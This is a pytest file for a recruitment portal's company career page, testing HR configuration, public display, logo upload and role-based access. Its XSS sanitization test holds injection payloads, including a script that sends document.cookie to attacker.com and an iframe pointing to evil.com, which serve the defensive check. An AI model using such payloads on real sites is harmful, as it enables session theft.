"""Tests for User Story SCRUM-55 (S2-09):
Là Trưởng phòng Nhân sự, tôi muốn cấu hình trang giới thiệu công ty trên cổng tuyển dụng,
để ứng viên hiểu về công ty trước khi quyết định nộp hồ sơ.

Acceptance Criteria:
- S2-09-AC01 (TC-S2-09-01): Soạn nội dung giới thiệu, tải ảnh và logo thực tế.
- S2-09-AC02 (TC-S2-09-02): Xem trước đúng như giao diện công khai trước khi lưu.
- TC-S2-09-X01: Nội dung trang công ty có HTML nguy hiểm -> Loại bỏ/escape, chống XSS.
- File upload & public asset access: Khách vãng lai tải được logo/banner không bị 401/404.
"""
import io
import json
import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

import app.models  # noqa: F401
from app.main import app
from app.db.session import Base
from app.db.seed_rbac import ROLES_DATA, PERMISSIONS_DATA, DEFAULT_GRANTED_MATRIX
from app.models.user import User
from app.models.rbac import Role, UserRole
from app.models.audit import Permission, RolePermission
from app.models.master_data import CareerPageSettings
from app.core.security import hash_password
from tests.conftest import session_token

engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False}, poolclass=StaticPool)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)


def override_get_db():
    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.close()


client = TestClient(app)


@pytest.fixture(autouse=True)
def ctx():
    Base.metadata.create_all(bind=engine)
    db = TestingSessionLocal()
    roles = {r["code"]: Role(code=r["code"], name=r["name"]) for r in ROLES_DATA}
    db.add_all(roles.values())
    for p in PERMISSIONS_DATA:
        db.add(Permission(code=p["code"], name=p["name"], module=p["module"]))
    for role_code, granted in DEFAULT_GRANTED_MATRIX.items():
        for p in PERMISSIONS_DATA:
            db.add(RolePermission(role_code=role_code, permission_code=p["code"], is_granted=p["code"] in granted))
    db.commit()

    users = {}
    for code, email in [
        ("hr_manager", "hrmanager@company.com"),
        ("candidate", "candidate@external.com"),
        ("interviewer", "interviewer@company.com"),
    ]:
        u = User(
            email=email,
            full_name=f"User {code}",
            hashed_password=hash_password("Password123!"),
            role=code,
            is_active=True,
            account_status="active",
        )
        db.add(u)
        db.commit()
        db.refresh(u)
        db.add(UserRole(user_id=u.id, role_id=roles[code].id))
        db.commit()
        users[code] = u

    headers = {
        "hr_manager": {"Authorization": f"Bearer {session_token(db, users['hr_manager'])}"},
        "candidate": {"Authorization": f"Bearer {session_token(db, users['candidate'])}"},
        "interviewer": {"Authorization": f"Bearer {session_token(db, users['interviewer'])}"},
    }

    db.close()
    yield {"users": users, "headers": headers}
    Base.metadata.drop_all(bind=engine)


def test_career_page_config_happy_path(ctx):
    """TC-S2-09-01: HR Manager configures company intro, slogan, contact and benefits."""
    hr_headers = ctx["headers"]["hr_manager"]

    payload = {
        "company_name": "Tập Đoàn Công Nghệ NextGen",
        "slogan": "Tiên phong chuyển đổi số - Nâng tầm sự nghiệp",
        "contact_email": "careers@nextgen.vn",
        "contact_phone": "024 3999 8888",
        "address": "Tầng 25, Keangnam Landmark 72, Hà Nội",
        "website": "https://nextgen.vn",
        "logo_url": "https://images.unsplash.com/photo-logo-test.png",
        "banner_url": "https://images.unsplash.com/photo-banner-test.jpg",
        "about_us": "NextGen được thành lập với tầm nhìn trở thành doanh nghiệp công nghệ hàng đầu khu vực. Chúng tôi kiến tạo môi trường làm việc cởi mở, sáng tạo.",
        "benefits": [
            {"title": "Gói bảo hiểm sức khỏe VIP", "description": "Bảo hiểm sức khỏe toàn diện cho bản thân và người thân.", "icon": "ShieldCheck"},
            {"title": "Ngân sách học tập $1500/năm", "description": "Hỗ trợ 100% học phí thi chứng chỉ quốc tế AWS, PMP, CFA.", "icon": "GraduationCap"},
            {"title": "Làm việc linh hoạt Hybrid", "description": "2 ngày WFH/tuần, thời gian làm việc linh hoạt theo hiệu quả.", "icon": "Laptop"},
        ],
    }

    # 1. HR Manager saves configuration
    resp = client.put("/api/v1/hr/career-page", headers=hr_headers, json=payload)
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["company_name"] == "Tập Đoàn Công Nghệ NextGen"
    assert data["configured"] is True
    assert len(data["benefits"]) == 3
    assert data["contact_email"] == "careers@nextgen.vn"
    assert "updated_at" in data

    # 2. HR Manager reads admin configuration
    admin_get = client.get("/api/v1/hr/career-page", headers=hr_headers)
    assert admin_get.status_code == 200
    admin_data = admin_get.json()
    assert admin_data["company_name"] == "Tập Đoàn Công Nghệ NextGen"
    assert admin_data["updated_by_name"] == "User hr_manager"

    # 3. Public candidate reads career page without login
    pub_resp = client.get("/api/v1/public/career-page")
    assert pub_resp.status_code == 200
    pub_data = pub_resp.json()
    assert pub_data["company_name"] == "Tập Đoàn Công Nghệ NextGen"
    assert pub_data["configured"] is True
    assert pub_data["contact_phone"] == "024 3999 8888"
    assert len(pub_data["benefits"]) == 3


def test_career_page_preview_and_public_sync(ctx):
    """TC-S2-09-02: Live preview and public career page reflect identical data structure before and after save."""
    # Before save, public returns default data with configured=False
    pub_initial = client.get("/api/v1/public/career-page").json()
    assert pub_initial["configured"] is False
    assert "company_name" in pub_initial

    hr_headers = ctx["headers"]["hr_manager"]
    payload = {
        "company_name": "Tập Đoàn ABC",
        "slogan": "Vươn tầm thế giới",
        "contact_email": "hr@abc.com",
        "contact_phone": "1900 1234",
        "address": "Hà Nội",
        "website": "https://abc.com",
        "logo_url": "https://abc.com/logo.png",
        "banner_url": "https://abc.com/banner.jpg",
        "about_us": "Văn hóa gắn kết và tôn trọng sự khác biệt.",
        "benefits": [{"title": "Thưởng tháng 13", "description": "Cam kết thưởng tối thiểu 1 tháng lương", "icon": "Award"}],
    }

    resp = client.put("/api/v1/hr/career-page", headers=hr_headers, json=payload)
    assert resp.status_code == 200

    pub_updated = client.get("/api/v1/public/career-page").json()
    assert pub_updated["configured"] is True
    assert pub_updated["company_name"] == "Tập Đoàn ABC"
    assert pub_updated["benefits"][0]["title"] == "Thưởng tháng 13"


def test_career_page_xss_sanitization(ctx):
    """TC-S2-09-X01: Script tags and dangerous attributes in about_us / fields must be sanitized."""
    hr_headers = ctx["headers"]["hr_manager"]

    malicious_payload = {
        "company_name": "Công Ty An Toàn <script>alert('pwned')</script>",
        "slogan": "Khẩu hiệu <img src=x onerror=alert(1)>",
        "contact_email": "safe@company.com",
        "contact_phone": "0123456789",
        "address": "Hà Nội <iframe src='http://evil.com'></iframe>",
        "website": "https://safe.com",
        "logo_url": "https://safe.com/logo.png",
        "banner_url": "https://safe.com/banner.jpg",
        "about_us": "<p>Chào mừng bạn!</p><script>document.location='http://attacker.com?c='+document.cookie</script><p onmouseover='alert(2)'>Văn hóa tốt</p>",
        "benefits": [
            {
                "title": "Phúc lợi <script>alert(3)</script>",
                "description": "Mô tả <a href='javascript:alert(4)'>Click</a>",
                "icon": "Award",
            }
        ],
    }

    resp = client.put("/api/v1/hr/career-page", headers=hr_headers, json=malicious_payload)
    assert resp.status_code == 200
    data = resp.json()

    # Scripts, iframes and dangerous inline handlers must be completely removed
    assert "<script" not in data["about_us"]
    assert "document.cookie" not in data["about_us"]
    assert "onmouseover" not in data["about_us"]
    assert "<script" not in data["company_name"]
    assert "alert('pwned')" not in data["company_name"]
    assert "<iframe" not in data["address"]
    assert "javascript:" not in data["benefits"][0]["description"]
    assert "<script" not in data["benefits"][0]["title"]


def test_file_upload_company_logo_and_banner_public_access(ctx):
    """Company logo and banner uploaded by HR can be downloaded publicly by candidates without authentication."""
    hr_headers = ctx["headers"]["hr_manager"]

    # 1. Fake 1x1 PNG bytes
    png_bytes = (
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4"
        b"\x00\x00\x00\rIDATx\x9cc\xf8\xff\xff?\x00\x05\xfe\x02\xfe\xa76u\xa4\x00\x00\x00\x00IEND\xaeB`\x82"
    )

    upload_resp = client.post(
        "/api/v1/files",
        headers=hr_headers,
        data={"kind": "company_logo"},
        files={"file": ("company_logo.png", io.BytesIO(png_bytes), "image/png")},
    )
    assert upload_resp.status_code == 201, upload_resp.text
    file_info = upload_resp.json()
    file_url = file_info["url"]
    file_id = file_info["id"]

    # 2. Public candidate (no Auth token) downloads the company logo
    dl_resp = client.get(f"/api/v1/files/{file_id}")
    assert dl_resp.status_code == 200
    assert dl_resp.headers["content-type"] == "image/png"
    assert len(dl_resp.content) == len(png_bytes)


def test_career_page_rbac_forbidden(ctx):
    """Non-HR users (candidate, interviewer) cannot update career page configuration."""
    payload = {
        "company_name": "Hacked Corp",
        "slogan": "Test",
        "contact_email": "test@test.com",
        "contact_phone": "123",
        "address": "HN",
        "website": "https://test.com",
        "logo_url": "https://test.com/logo.png",
        "banner_url": "https://test.com/banner.jpg",
        "about_us": "Test",
        "benefits": [],
    }

    # Candidate should get 403 Forbidden
    candidate_resp = client.put("/api/v1/hr/career-page", headers=ctx["headers"]["candidate"], json=payload)
    assert candidate_resp.status_code == 403

    # Interviewer should get 403 Forbidden
    interviewer_resp = client.put("/api/v1/hr/career-page", headers=ctx["headers"]["interviewer"], json=payload)
    assert interviewer_resp.status_code == 403
